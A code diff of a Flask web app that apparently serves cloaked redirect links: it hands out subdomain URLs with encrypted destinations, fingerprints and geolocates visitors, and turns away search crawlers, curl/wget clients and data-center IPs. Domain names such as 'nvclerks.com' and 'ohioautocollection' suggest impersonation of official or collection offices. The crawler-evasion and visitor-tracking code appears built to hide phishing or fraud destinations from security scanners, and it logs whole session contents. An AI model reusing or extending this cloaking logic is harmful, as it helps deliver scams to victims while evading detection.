@@ -16,7 +16,6 @@ import hashlib
 from valkey import Valkey
 from functools import wraps
 import requests
-import traceback
 from user_agents import parse
 from dotenv import load_dotenv
 import csv
@@ -56,7 +55,7 @@ def get_base_domain():
         return host
     except Exception as e:
         logger.error(f"Error getting base domain: {str(e)}")
-        return "nvclerks.com"  # Fallback
+        return "nvclerks.com"
 
 # Configuration
 try:
@@ -69,17 +68,6 @@ try:
 except Exception as e:
     logger.error(f"Error setting Flask config: {str(e)}", exc_info=True)
     raise
-
-# Log environment variables
-logger.debug(f"FLASK_SECRET_KEY: {'set' if os.getenv('FLASK_SECRET_KEY') else 'auto-generated'}")
-logger.debug(f"ENCRYPTION_KEY: {'set' if os.getenv('ENCRYPTION_KEY') else 'auto-generated'}")
-logger.debug(f"HMAC_KEY: {'set' if os.getenv('HMAC_KEY') else 'auto-generated'}")
-logger.debug(f"VALKEY_HOST: {VALKEY_HOST}")
-logger.debug(f"VALKEY_PORT: {VALKEY_PORT}")
-logger.debug(f"VALKEY_USERNAME: {VALKEY_USERNAME}")
-logger.debug(f"VALKEY_PASSWORD: {'set' if VALKEY_PASSWORD else 'not set'}")
-logger.debug(f"MAXMIND_KEY: {'set' if MAXMIND_KEY else 'not set'}")
-logger.debug(f"USER_TXT_URL: {USER_TXT_URL}")
 
 # Valkey initialization
 valkey_client = None
@@ -106,15 +94,13 @@ def datetime_filter(timestamp):
         logger.error(f"Error formatting timestamp: {str(e)}")
         return "Unknown"
 
-# Register the filter
 app.jinja_env.filters['datetime'] = datetime_filter
 
 # Bot detection patterns
 BOT_PATTERNS = ["googlebot", "bingbot", "yandex", "duckduckbot", "curl/", "wget/", "headless"]
 
-def is_bot(user_agent, headers, ip):
+def is_bot(user_agent, headers, ip, endpoint):
     try:
-        # Allow authenticated users
         if 'username' in session:
             logger.debug(f"IP {ip} is authenticated, skipping bot check")
             return False, "Authenticated user"
@@ -137,11 +123,12 @@ def is_bot(user_agent, headers, ip):
                 return True, "Rapid requests"
             valkey_client.incr(key)
             valkey_client.expire(key, 60)
-        # Check IP reputation (simplified, requires MAXMIND_KEY for full implementation)
         if ip.startswith(('162.249.', '5.62.', '84.39.')):
             logger.warning(f"Blocked IP {ip}: Data center IP range")
             return True, "Data center IP"
-        # Behavioral check: Require JS challenge or fingerprint
+        if endpoint == "/login" and headers.get('Referer') and 'Mozilla' in user_agent:
+            logger.debug(f"IP {ip} allowed for /login with valid headers")
+            return False, "Likely human (login attempt)"
         if 'js_verified' not in session:
             logger.warning(f"Blocked IP {ip}: Missing JS verification")
             return True, "Missing JS verification"
@@ -189,7 +176,8 @@ def rate_limit(limit=5, per=60):
                 ip = request.remote_addr
                 user_agent = request.headers.get("User-Agent", "")
                 headers = request.headers
-                is_bot_flag, bot_reason = is_bot(user_agent, headers, ip)
+                endpoint = request.path
+                is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, endpoint)
                 if is_bot_flag:
                     logger.warning(f"Blocked request from IP {ip}: {bot_reason}")
                     abort(403, f"Access denied: {bot_reason}")
@@ -247,7 +235,6 @@ def verify_browser():
         logger.error(f"Error in verify_browser: {str(e)}", exc_info=True)
         return True
 
-# Encryption Methods
 def encrypt_heap_x3(payload, fingerprint):
     try:
         iv = secrets.token_bytes(12)
@@ -402,7 +389,6 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
-# Block ohioautocollection.nvclerks.com
 @app.before_request
 def block_ohio_subdomain():
     if request.host == 'ohioautocollection.nvclerks.com':
@@ -441,6 +427,41 @@ def login():
                         .container { animation: fadeIn 1s ease-in; }
                         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                     </style>
+                    <script>
+                        function sendChallenge() {
+                            let challenge = 0;
+                            for (let i = 0; i < 1000; i++) challenge += Math.random();
+                            fetch('/challenge', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ challenge })
+                            }).then(response => {
+                                if (!response.ok) {
+                                    console.error('Challenge failed:', response.status);
+                                    setTimeout(sendChallenge, 1000);
+                                }
+                            }).catch(error => {
+                                console.error('Challenge error:', error);
+                                setTimeout(sendChallenge, 1000);
+                            });
+                        }
+                        function getCanvasFingerprint() {
+                            const canvas = document.createElement('canvas');
+                            const ctx = canvas.getContext('2d');
+                            ctx.textBaseline = 'top';
+                            ctx.font = '14px Arial';
+                            ctx.fillText('Fingerprint', 2, 2);
+                            return canvas.toDataURL();
+                        }
+                        window.onload = function() {
+                            sendChallenge();
+                            fetch('/fingerprint', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ fingerprint: getCanvasFingerprint() })
+                            }).catch(error => console.error('Fingerprint error:', error));
+                        };
+                    </script>
                 </head>
                 <body class="min-h-screen flex items-center justify-center p-4">
                     <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
@@ -472,6 +493,41 @@ def login():
                     .container { animation: fadeIn 1s ease-in; }
                     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                 </style>
+                <script>
+                    function sendChallenge() {
+                        let challenge = 0;
+                        for (let i = 0; i < 1000; i++) challenge += Math.random();
+                        fetch('/challenge', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ challenge })
+                        }).then(response => {
+                            if (!response.ok) {
+                                console.error('Challenge failed:', response.status);
+                                setTimeout(sendChallenge, 1000);
+                            }
+                        }).catch(error => {
+                            console.error('Challenge error:', error);
+                            setTimeout(sendChallenge, 1000);
+                        });
+                    }
+                    function getCanvasFingerprint() {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        ctx.textBaseline = 'top';
+                        ctx.font = '14px Arial';
+                        ctx.fillText('Fingerprint', 2, 2);
+                        return canvas.toDataURL();
+                    }
+                    window.onload = function() {
+                        sendChallenge();
+                        fetch('/fingerprint', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ fingerprint: getCanvasFingerprint() })
+                        }).catch(error => console.error('Fingerprint error:', error));
+                    };
+                </script>
             </head>
             <body class="min-h-screen flex items-center justify-center p-4">
                 <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
@@ -556,7 +612,6 @@ def dashboard():
             randomstring2 = request.form.get("randomstring2", generate_random_string(8))
             expiry = int(request.form.get("expiry", 86400))
 
-            # Validate inputs
             if not re.match(r"^https?://", destination_link):
                 error = "Invalid URL"
             elif not (2 <= len(subdomain) <= 100 and re.match(r"^[A-Za-z0-9-]{2,100}$", subdomain)):
@@ -621,7 +676,6 @@ def dashboard():
                     if not error:
                         return redirect(url_for('dashboard'))
 
-        # Fetch URL history
         urls = []
         valkey_error = None
         if valkey_client:
@@ -666,7 +720,6 @@ def dashboard():
         else:
             valkey_error = "Database unavailable"
 
-        # Fetch visitor data
         visitors = []
         bot_logs = []
         traffic_sources = {"direct": 0, "referral": 0, "organic": 0}
@@ -766,28 +819,6 @@ def dashboard():
                     function refreshDashboard() {
                         window.location.reload();
                     }
-                    let challenge = 0;
-                    for (let i = 0; i < 1000; i++) challenge += Math.random();
-                    fetch('/challenge', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ challenge })
-                    }).then(response => {
-                        if (!response.ok) window.location = '/denied';
-                    });
-                    function getCanvasFingerprint() {
-                        const canvas = document.createElement('canvas');
-                        const ctx = canvas.getContext('2d');
-                        ctx.textBaseline = 'top';
-                        ctx.font = '14px Arial';
-                        ctx.fillText('Fingerprint', 2, 2);
-                        return canvas.toDataURL();
-                    }
-                    fetch('/fingerprint', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ fingerprint: getCanvasFingerprint() })
-                    });
                 </script>
             </head>
             <body class="min-h-screen p-4">
@@ -1290,7 +1321,7 @@ def challenge():
         session['js_verified'] = True
         session.permanent = True
         session.modified = True
-        logger.debug("JS challenge passed")
+        logger.debug(f"JS challenge passed, session: {session}")
         return {"status": "ok"}, 200
     except Exception as e:
         logger.error(f"Error in challenge: {str(e)}", exc_info=True)
@@ -1326,8 +1357,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         session['session_start'] = session_start
         logger.debug(f"Redirect handler for {username}.{base_domain}/{endpoint}, IP: {ip}, User-Agent: {user_agent}, URL: {request.url}")
 
-        # Bot detection
-        is_bot_flag, bot_reason = is_bot(user_agent, headers, ip)
+        is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
         asn_blocked = check_asn(ip)
         ua = parse(user_agent)
         device = "Desktop"
@@ -1344,13 +1374,9 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         elif app != "Unknown" and app != ua.browser.family:
             visit_type = "App"
 
-        # GeoIP
         location = get_geoip(ip)
-
-        # Calculate session duration
         session_duration = int(time.time()) - session_start
 
-        # Log visitor
         if valkey_client:
             try:
                 visitor_id = hashlib.sha256(f"{ip}{time.time()}".encode()).hexdigest()
@@ -1377,7 +1403,6 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             logger.warning(f"Blocked redirect for IP {ip}: {bot_reason}")
             abort(403, f"Access denied: {bot_reason}")
 
-        # Log visit
         url_id = hashlib.sha256(request.url.encode()).hexdigest()
         if valkey_client:
             try:
@@ -1395,7 +1420,6 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             except Exception as e:
                 logger.error(f"Valkey error logging visit: {str(e)}")
 
-        # Decrypt payload
         try:
             encrypted_payload = urllib.parse.unquote(encrypted_payload)
             logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
@@ -1497,12 +1521,16 @@ def generate_random_string(length):
     try:
         characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
         result = "".join(secrets.choice(characters) for _ in range(length))
-        logger.debug(f"Generated random string: {result}")
+        logger.debug(f"Generated random string: {result[:10]}...")
         return result
     except Exception as e:
-        logger.error(f"Error in generate_random_string: {str(e)}", exc_info=True)
-        return "x" * length
+        logger.error(f"Error generating random string: {str(e)}", exc_info=True)
+        return secrets.token_hex(length // 2)
 
 if __name__ == "__main__":
-    logger.debug("Starting Flask app")
-    app.run(debug=False)
+    try:
+        app.run(host="0.0.0.0", port=5000, debug=False)
+    except Exception as e:
+        logger.error(f"Error starting Flask app: {str(e)}", exc_info=True)
+        import sys
+        sys.exit(1)
